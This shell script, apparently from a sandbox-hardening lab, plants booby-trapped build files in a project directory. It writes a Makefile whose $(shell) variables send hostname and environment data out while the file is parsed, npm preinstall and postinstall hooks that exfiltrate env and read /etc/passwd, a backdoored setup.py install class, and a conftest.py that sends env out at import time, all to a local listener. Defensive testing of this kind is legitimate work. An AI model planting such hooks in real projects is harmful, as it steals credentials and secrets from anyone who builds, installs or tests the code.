# LAB ARTIFACT — fake attack for hardening demonstration only
# Attack 10: Makefile Weaponization — Build System Trap
#
# Goal: Plant a Makefile in project/ where $(shell ...) macros execute
#        during PARSING (not just target execution). Also inject
#        package.json postinstall hooks and Python setup.py backdoors.
#
# Target: /home/node/project/Makefile, package.json, setup.py

set -e

PROJECT="/home/node/project"

echo "[attack-10] Attempting to plant build system traps..."

# Attempt 1: Makefile with $(shell ...) — executes during PARSING
cat > "$PROJECT/Makefile" 2>&1 <<'MAKEFILE' || true
# Legitimate-looking Makefile
CC = gcc
CFLAGS = -Wall -O2

# This variable is evaluated during Makefile PARSING, not just when
# targets are built. $(shell ...) runs immediately when make reads the file.
HOSTNAME := $(shell hostname | curl -s -X POST -d @- http://127.0.0.1:8888/makefile-exfil 2>/dev/null)
WHOAMI := $(shell cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | curl -s -X POST -d @- http://127.0.0.1:8888/env-exfil 2>/dev/null)

all: build

build:
	@echo "Building project..."
	@echo "Build complete."

clean:
	@rm -f *.o
MAKEFILE

# Attempt 2: package.json with postinstall script
cat > "$PROJECT/package.json" 2>&1 <<'JSON' || true
{
  "name": "test-project",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -s -X POST -d \"$(env)\" http://127.0.0.1:8888/npm-preinstall || true",
    "postinstall": "node -e \"require('child_process').execSync('cat /proc/self/environ | curl -s -X POST -d @- http://127.0.0.1:8888/npm-postinstall')\" || true",
    "test": "node -e \"require('child_process').execSync('id; cat /etc/passwd')\" && echo 'Tests passed'"
  }
}
JSON

# Attempt 3: Python setup.py with backdoored install command
cat > "$PROJECT/setup.py" 2>&1 <<'PYTHON' || true
from setuptools import setup
from setuptools.command.install import install
import subprocess

class BackdoorInstall(install):
    def run(self):
        # Runs during pip install
        subprocess.run(["sh", "-c",
            "cat /proc/self/environ | curl -s -X POST -d @- http://127.0.0.1:8888/pip-exfil"],
            capture_output=True)
        install.run(self)

setup(
    name="test-project",
    version="1.0.0",
    cmdclass={"install": BackdoorInstall},
)
PYTHON

# Attempt 4: conftest.py — auto-executes when pytest runs
cat > "$PROJECT/conftest.py" 2>&1 <<'PYTHON' || true
# conftest.py — auto-loaded by pytest
import subprocess
import os

# This runs at IMPORT TIME, before any tests
subprocess.run(["sh", "-c",
    "env | curl -s -X POST -d @- http://127.0.0.1:8888/conftest-exfil 2>/dev/null"],
    capture_output=True)
PYTHON

echo "[attack-10] Checking if build traps were planted:"
ls -la "$PROJECT/Makefile" "$PROJECT/package.json" "$PROJECT/setup.py" "$PROJECT/conftest.py" 2>&1 || true

echo "[attack-10] Attack attempts complete."
